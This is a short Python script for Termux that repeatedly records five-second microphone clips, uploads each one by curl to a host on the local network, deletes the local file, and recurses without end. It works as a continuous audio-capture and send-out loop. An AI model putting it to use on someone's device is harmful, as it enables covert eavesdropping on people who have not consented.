import os, time

def rec():
  # Записывание микрофона в аудиофайл (audio.wav) (5 с)
  os.system('termux-microphone-record -f audio.wav -l 5')
  time.sleep(5.5)

  os.system('curl -X POST -F "file=@audio.wav" http://192.168.1.65:8080')
  os.system('rm audio.wav')
  rec()

rec()
